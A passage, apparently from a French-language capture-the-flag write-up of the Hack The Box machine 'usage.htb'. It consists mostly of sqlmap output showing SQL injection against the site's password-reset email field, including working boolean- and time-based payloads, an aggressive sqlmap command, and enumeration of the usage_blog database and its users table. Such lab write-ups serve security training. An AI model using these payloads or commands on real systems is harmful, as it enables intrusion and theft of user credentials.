+</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s2>&#34;]_____ ___ ___  {1.6.4#stable}
+</span></span></span><span class=line><span class=cl><span class=s2>|_ -| . [,]     | .&#39;| . |
+</span></span></span><span class=line><span class=cl><span class=s2>|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span class=line><span class=cl><span class=s2>      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>[*] starting @ 23:16:02 /2024-08-06/
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:02] [INFO] parsing HTTP request from &#39;request.txt&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:02] [INFO] testing connection to the target URL
+</span></span></span><span class=line><span class=cl><span class=s2>got a 302 redirect to &#39;http://usage.htb/forget-password&#39;. Do you want to follow? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:05] [INFO] testing if the target URL content is stable
+</span></span></span><span class=line><span class=cl><span class=s2>you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:08] [WARNING] heuristic (basic) test shows that POST parameter &#39;email&#39; might not be injectable
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:10] [INFO] testing for SQL injection on POST parameter &#39;email&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:10] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:16:55] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:09] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (NOT)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:25] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:25] [INFO] POST parameter &#39;email&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#39; injectable 
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:28] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39; 
+</span></span></span><span class=line><span class=cl><span class=s2>it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:28] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:28] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:29] [INFO] testing &#39;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:30] [INFO] testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;Generic inline queries&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL inline queries&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:31] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:32] [INFO] testing &#39;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:33] [INFO] testing &#39;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:34] [INFO] testing &#39;MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:17:34] [INFO] testing &#39;MySQL &gt; 5.0.12 AND time-based blind (heavy query)&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:18:34] [INFO] POST parameter &#39;email&#39; appears to be &#39;MySQL &gt; 5.0.12 AND time-based blind (heavy query)&#39; injectable 
+</span></span></span><span class=line><span class=cl><span class=s2>[23:18:34] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:18:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+</span></span></span><span class=line><span class=cl><span class=s2>[23:18:39] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+</span></span></span><span class=line><span class=cl><span class=s2>[23:18:42] [INFO] target URL appears to have 8 columns in query
+</span></span></span><span class=line><span class=cl><span class=s2>do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+</span></span></span><span class=line><span class=cl><span class=s2>injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>[23:19:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. &#39;--dbms=mysql&#39;) 
+</span></span></span><span class=line><span class=cl><span class=s2>[23:20:09] [INFO] target URL appears to be UNION injectable with 8 columns
+</span></span></span><span class=line><span class=cl><span class=s2>injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;--union-char&#39;? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s2>[23:21:28] [INFO] testing &#39;Generic UNION query (53) - 21 to 40 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:21:50] [INFO] testing &#39;Generic UNION query (53) - 41 to 60 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:22:08] [INFO] testing &#39;Generic UNION query (53) - 61 to 80 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:22:31] [INFO] testing &#39;Generic UNION query (53) - 81 to 100 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:22:53] [INFO] testing &#39;MySQL UNION query (53) - 1 to 20 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:23:41] [INFO] testing &#39;MySQL UNION query (53) - 21 to 40 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:24:07] [INFO] testing &#39;MySQL UNION query (53) - 41 to 60 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:24:24] [INFO] testing &#39;MySQL UNION query (53) - 61 to 80 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:24:45] [INFO] testing &#39;MySQL UNION query (53) - 81 to 100 columns&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:14] [INFO] checking if the injection point on POST parameter &#39;email&#39; is a false positive
+</span></span></span><span class=line><span class=cl><span class=s2>POST parameter &#39;email&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+</span></span></span><span class=line><span class=cl><span class=s2>sqlmap identified the following injection point(s) with a total of 735 HTTP(s) requests:
+</span></span></span><span class=line><span class=cl><span class=s2>---
+</span></span></span><span class=line><span class=cl><span class=s2>Parameter: email (POST)
+</span></span></span><span class=line><span class=cl><span class=s2>    Type: boolean-based blind
+</span></span></span><span class=line><span class=cl><span class=s2>    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+</span></span></span><span class=line><span class=cl><span class=s2>    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#39; AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Type: time-based blind
+</span></span></span><span class=line><span class=cl><span class=s2>    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
+</span></span></span><span class=line><span class=cl><span class=s2>    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#39; AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
+</span></span></span><span class=line><span class=cl><span class=s2>---
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:34] [INFO] the back-end DBMS is MySQL
+</span></span></span><span class=line><span class=cl><span class=s2>web server operating system: Linux Ubuntu
+</span></span></span><span class=line><span class=cl><span class=s2>web application technology: Nginx 1.18.0
+</span></span></span><span class=line><span class=cl><span class=s2>back-end DBMS: MySQL &gt; 5.0.12
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:41] [INFO] fetching database names
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:41] [INFO] fetching number of databases
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:41] [INFO] retrieved: 3
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:47] [INFO] retrieving the length of query output
+</span></span></span><span class=line><span class=cl><span class=s2>[23:25:47] [INFO] retrieved: 18
+</span></span></span><span class=line><span class=cl><span class=s2>[23:26:30] [INFO] retrieved: information_schema             
+</span></span></span><span class=line><span class=cl><span class=s2>[23:26:30] [INFO] retrieving the length of query output
+</span></span></span><span class=line><span class=cl><span class=s2>[23:26:30] [INFO] retrieved: 18
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:10] [INFO] retrieved: performance_schema             
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:10] [INFO] retrieving the length of query output
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:10] [INFO] retrieved: 10
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:36] [INFO] retrieved: usage_blog             
+</span></span></span><span class=line><span class=cl><span class=s2>available databases [3]:
+</span></span></span><span class=line><span class=cl><span class=s2>[*] information_schema
+</span></span></span><span class=line><span class=cl><span class=s2>[*] performance_schema
+</span></span></span><span class=line><span class=cl><span class=s2>[*] usage_blog
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:36] [WARNING] HTTP error codes detected during run:
+</span></span></span><span class=line><span class=cl><span class=s2>500 (Internal Server Error) - 511 times
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:36] [INFO] fetched data logged to text files under &#39;/home/leopold/.local/share/sqlmap/output/usage.htb&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>[23:27:36] [WARNING] your sqlmap version is outdated
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>[*] ending @ 23:27:36 /2024-08-06/
+</span></span></span></code></pre></td></tr></table></div></div><p>Il est bien vulnérable ! On trouve une base de donnée mysql : <code>usage_blog</code></p><h3 id=mysql---usage_blog>MySQL - usage_blog</h3><p>A l&rsquo;aide de plusieurs requête, on trouve un table <code>users</code> dans la base de données <code>usage_blog</code>. Dans cette bdd, on trouve les champs:</p><ul><li>email</li><li>password</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span><span class=lnt>98
+</span><span class=lnt>99
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -r request.txt --data<span class=o>=</span><span class=s2>&#34;_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#34;</span> -p email --batch --level <span class=m>5</span> --risk <span class=m>3</span> --threads <span class=m>10</span> -D usage_blog -T users --columns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        ___
+</span></span><span class=line><span class=cl>       __H__
+</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span>.<span class=o>]</span>_____ ___ ___  <span class=o>{</span>1.6.4#stable<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[</span>,<span class=o>]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
+</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [.]_|_|_|__,|  _|
+</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 23:30:20 /2024-08-06/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:20<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> parsing HTTP request from <span class=s1>&#39;request.txt&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resuming back-end DBMS <span class=s1>&#39;mysql&#39;</span> 
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
+</span></span><span class=line><span class=cl>got a <span class=m>302</span> redirect to <span class=s1>&#39;http://usage.htb/forget-password&#39;</span>. Do you want to follow? <span class=o>[</span>Y/n<span class=o>]</span> Y
+</span></span><span class=line><span class=cl>redirect is a result of a POST request. Do you want to resend original POST data to a new location? <span class=o>[</span>Y/n<span class=o>]</span> Y
+</span></span><span class=line><span class=cl>sqlmap resumed the following injection point<span class=o>(</span>s<span class=o>)</span> from stored session:
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>Parameter: email <span class=o>(</span>POST<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Type: boolean-based blind
+</span></span><span class=line><span class=cl>    Title: AND boolean-based blind - WHERE or HAVING clause <span class=o>(</span>subquery - comment<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>_token</span><span class=o>=</span>SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh<span class=p>&amp;</span><span class=nv>email</span><span class=o>=</span>leopold<span class=s1>&#39; AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: time-based blind
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#39;</span> AND <span class=nv>1208</span><span class=o>=(</span>SELECT COUNT<span class=o>(</span>*<span class=o>)</span> FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C<span class=o>)</span>-- zgvX
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:23<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
+</span></span><span class=line><span class=cl>web server operating system: Linux Ubuntu
+</span></span><span class=line><span class=cl>web application technology: Nginx 1.18.0
+</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt; 5.0.12
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:23<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching columns <span class=k>for</span> table <span class=s1>&#39;users&#39;</span> in database <span class=s1>&#39;usage_blog&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:23<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: 
+</span></span><span class=line><span class=cl>you provided a HTTP Cookie header value, <span class=k>while</span> target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? <span class=o>[</span>Y/n<span class=o>]</span> Y
+</span></span><span class=line><span class=cl><span class=m>8</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:30:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:00<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: created_at             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:00<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:00<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>9</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:16<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: timestamp           
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:16<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:16<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:34<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: email           <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>&lt;&lt;
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:34<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:31:34<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>12</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>17</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:54<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: email_verified_at             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:54<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:32:54<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>9</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: timestamp           
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:42<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: id           
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:42<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:33:42<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>15</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:15<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: bigint unsigned             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:16<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:15<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>4</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: name           
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
